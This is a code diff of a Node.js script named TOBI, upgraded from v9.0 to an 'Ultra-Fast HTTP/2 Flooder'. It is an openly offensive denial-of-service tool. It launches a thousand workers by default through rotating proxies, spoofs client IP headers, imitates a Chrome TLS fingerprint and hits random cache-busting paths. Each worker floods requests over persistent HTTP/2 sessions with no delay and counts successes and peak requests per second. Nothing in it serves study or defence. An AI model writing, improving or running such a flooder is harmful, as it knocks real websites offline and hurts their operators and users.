@@ -1,14 +1,17 @@
 #!/usr/bin/env node
 
 /**
- * TOBI v9.0 – Simple & Working
- * No HTTP/2, just HTTPS with real success tracking
+ * TOBI v10.0 – Ultra‑Fast HTTP/2 Flooder
+ * Persistent connections | No delays | Real success tracking
  */
 
-const https = require('https');
 const fs = require('fs');
-const readline = require('readline');
+const net = require('net');
+const tls = require('tls');
+const http2 = require('http2');
 const crypto = require('crypto');
+const readline = require('readline');
+const https = require('https');
 
 // Colors
 const c = {
@@ -22,6 +25,7 @@ let duration = 60;
 let workers = 1000;
 let proxyFile = null;
 let stop = false;
+let activeSessions = 0;
 
 // ==================== PROXY LOADER ====================
 let proxies = [];
@@ -47,6 +51,29 @@ function getProxy() {
     return proxies[proxyIndex];
 }
 
+// ==================== TLS FINGERPRINT (Chrome 122) ====================
+const TLS_CIPHERS = [
+    'TLS_AES_256_GCM_SHA384',
+    'TLS_CHACHA20_POLY1305_SHA256',
+    'TLS_AES_128_GCM_SHA256',
+    'ECDHE-ECDSA-AES128-GCM-SHA256',
+    'ECDHE-RSA-AES128-GCM-SHA256',
+    'ECDHE-ECDSA-CHACHA20-POLY1305',
+    'ECDHE-RSA-CHACHA20-POLY1305',
+    'ECDHE-ECDSA-AES256-GCM-SHA384',
+    'ECDHE-RSA-AES256-GCM-SHA384'
+].join(':');
+
+const TLS_OPTIONS = {
+    ciphers: TLS_CIPHERS,
+    ecdhCurve: 'X25519',
+    minVersion: 'TLSv1.2',
+    maxVersion: 'TLSv1.3',
+    honorCipherOrder: true,
+    rejectUnauthorized: false,
+    ALPNProtocols: ['h2', 'http/1.1']
+};
+
 // ==================== UTILITIES ====================
 function randomString(len) {
     return crypto.randomBytes(len).toString('hex');
@@ -64,52 +91,111 @@ const USER_AGENTS = [
 
 function generateHeaders(host) {
     return {
-        'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive',
-        'X-Forwarded-For': spoofIP(),
-        'X-Real-IP': spoofIP(),
-        'Referer': 'https://www.google.com/',
-        'Cache-Control': 'no-cache'
+        ':method': 'GET',
+        ':path': `/${randomString(8)}?t=${Date.now()}&r=${randomString(6)}`,
+        ':scheme': 'https',
+        ':authority': host,
+        'user-agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'accept-language': 'en-US,en;q=0.9',
+        'accept-encoding': 'gzip, deflate, br',
+        'cache-control': 'no-cache',
+        'x-forwarded-for': spoofIP(),
+        'x-real-ip': spoofIP(),
+        'referer': 'https://www.google.com/'
     };
 }
 
-// ==================== SIMPLE HTTPS REQUEST ====================
-function attack(targetUrl, callback) {
-    // FORCE HTTPS PROTOCOL
-    let fullUrl = targetUrl;
-    if (!fullUrl.startsWith('http')) fullUrl = 'https://' + fullUrl;
-    const parsed = new URL(fullUrl);
-    const path = `/${randomString(8)}?t=${Date.now()}&r=${randomString(6)}`;
-    const headers = generateHeaders(parsed.hostname);
-    const start = Date.now();
-
-    const options = {
-        hostname: parsed.hostname,
-        port: 443,
-        path: path,
-        method: 'GET',
-        headers: headers,
-        timeout: 10000,
-        rejectUnauthorized: false
-    };
-
-    const req = https.request(options, (res) => {
-        let data = '';
-        res.on('data', () => {});
-        res.on('end', () => {
-            const success = (res.statusCode >= 200 && res.statusCode < 400);
-            callback(success, res.statusCode);
-        });
+// ==================== HTTP/2 PERSISTENT SESSION ====================
+// Each worker gets its own persistent HTTP/2 session (reused for all requests)
+function createSession(parsedHost, proxy) {
+    return new Promise((resolve, reject) => {
+        let socket;
+        if (proxy) {
+            const [proxyHost, proxyPort] = proxy.split(':');
+            socket = net.connect(parseInt(proxyPort), proxyHost, () => {
+                const tlsSocket = tls.connect({
+                    host: parsedHost.hostname,
+                    port: 443,
+                    socket: socket,
+                    ...TLS_OPTIONS,
+                    servername: parsedHost.hostname
+                }, () => {
+                    const session = http2.connect(parsedHost.hostname, {
+                        createConnection: () => tlsSocket,
+                        ...TLS_OPTIONS
+                    });
+                    session.on('error', () => reject());
+                    resolve(session);
+                });
+                tlsSocket.on('error', () => reject());
+            });
+            socket.on('error', () => reject());
+        } else {
+            const tlsSocket = tls.connect({
+                host: parsedHost.hostname,
+                port: 443,
+                ...TLS_OPTIONS,
+                servername: parsedHost.hostname
+            }, () => {
+                const session = http2.connect(parsedHost.hostname, {
+                    createConnection: () => tlsSocket,
+                    ...TLS_OPTIONS
+                });
+                session.on('error', () => reject());
+                resolve(session);
+            });
+            tlsSocket.on('error', () => reject());
+        }
     });
-    req.on('error', () => callback(false, null));
-    req.on('timeout', () => {
-        req.destroy();
-        callback(false, null);
-    });
-    req.end();
+}
+
+// ==================== WORKER (with persistent session) ====================
+async function worker(parsedHost) {
+    if (stop) return;
+    let session = null;
+    try {
+        session = await createSession(parsedHost, getProxy());
+        activeSessions++;
+    } catch(e) {
+        // Failed to create session – retry later
+        setTimeout(() => worker(parsedHost), 100);
+        return;
+    }
+
+    // Flood loop – send requests as fast as possible
+    while (!stop) {
+        try {
+            const headers = generateHeaders(parsedHost.hostname);
+            const req = session.request(headers);
+            req.on('response', (responseHeaders) => {
+                const status = responseHeaders[':status'];
+                const success = (status >= 200 && status < 400);
+                stats.total++;
+                if (success) stats.success++;
+                else stats.failed++;
+                const nowSec = Date.now() / 1000;
+                if (nowSec - stats.lastSec >= 1) {
+                    if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
+                    stats.lastSecCount = 0;
+                    stats.lastSec = nowSec;
+                }
+                stats.lastSecCount++;
+            });
+            req.on('error', () => {
+                stats.total++;
+                stats.failed++;
+            });
+            req.end();
+        } catch(e) {
+            // Session error – recreate
+            break;
+        }
+    }
+    // Clean up
+    if (session) session.destroy();
+    activeSessions--;
+    if (!stop) worker(parsedHost);
 }
 
 // ==================== STATISTICS ====================
@@ -129,28 +215,13 @@ function displayStats() {
         `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
 }
 
-function worker() {
-    if (stop) return;
-    attack(target, (success, code) => {
-        stats.total++;
-        if (success) stats.success++;
-        else stats.failed++;
-        const nowSec = Date.now() / 1000;
-        if (nowSec - stats.lastSec >= 1) {
-            if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
-            stats.lastSecCount = 0;
-            stats.lastSec = nowSec;
-        }
-        stats.lastSecCount++;
-        worker();
-    });
-}
-
 // ==================== CHECK-HOST.NET ====================
 function checkHost(target) {
     return new Promise((resolve) => {
-        const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
-        console.log(`${c.cyan}[*] Checking ${target} via check-host.net...${c.reset}`);
+        let cleanTarget = target;
+        if (!cleanTarget.startsWith('http')) cleanTarget = 'https://' + cleanTarget;
+        const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(cleanTarget)}`;
+        console.log(`${c.cyan}[*] Checking ${cleanTarget} via check-host.net...${c.reset}`);
         const req = https.get(checkUrl, { rejectUnauthorized: false }, (res) => {
             let data = '';
             res.on('data', chunk => data += chunk);
@@ -169,7 +240,7 @@ function checkHost(target) {
 
 // ==================== MAIN ====================
 async function start() {
-    // FIX TARGET PROTOCOL
+    // Ensure target has protocol
     let fixedTarget = target;
     if (!fixedTarget.startsWith('http')) fixedTarget = 'https://' + fixedTarget;
     target = fixedTarget;
@@ -177,8 +248,8 @@ async function start() {
     console.log(c.clear);
     console.log(`${c.red}${c.bold}
 ╔══════════════════════════════════════════════════════════════════════════╗
-║                         🔥 TOBI v9.0 – WORKING 🔥                        ║
-║                     HTTPS | Real Success | Instant                       ║
+║                      🔥 TOBI v10.0 – ULTRA FAST 🔥                       ║
+║            HTTP/2 Persistent | Proxy Rotation | Instant                  ║
 ╚══════════════════════════════════════════════════════════════════════════╝${c.reset}`);
     console.log(`\n${c.green}[✓] Target: ${target}`);
     console.log(`[✓] Duration: ${duration}s`);
@@ -188,16 +259,22 @@ async function start() {
 
     await checkHost(target);
 
+    const parsedHost = new URL(target);
     stats.startTime = Date.now();
     stats.lastSec = stats.startTime / 1000;
 
     console.log(`${c.yellow}[!] Launching ${workers} workers...${c.reset}`);
     for (let i = 0; i < workers; i++) {
-        worker();
+        worker(parsedHost);
     }
     console.log(`${c.green}[✓] All workers launched!${c.reset}\n`);
 
     const interval = setInterval(displayStats, 1000);
+
+    // Stop exactly after duration
+    setTimeout(() => {
+        stop = true;
+    }, duration * 1000);
 
     process.on('SIGINT', () => {
         console.log(`\n${c.yellow}[!] Shutting down...${c.reset}`);
@@ -217,15 +294,11 @@ async function start() {
             console.log(`  Duration:        ${elapsed.toFixed(1)}s`);
             console.log(`${c.magenta}════════════════════════════════════════════════════════════════${c.reset}`);
             process.exit(0);
-        }, 1000);
+        }, 500);
     });
-
-    setTimeout(() => {
-        stop = true;
-    }, duration * 1000);
 }
 
-// ==================== INTERACTIVE OR COMMAND LINE ====================
+// ==================== COMMAND LINE / INTERACTIVE ====================
 (async () => {
     if (process.argv[2]) {
         target = process.argv[2];
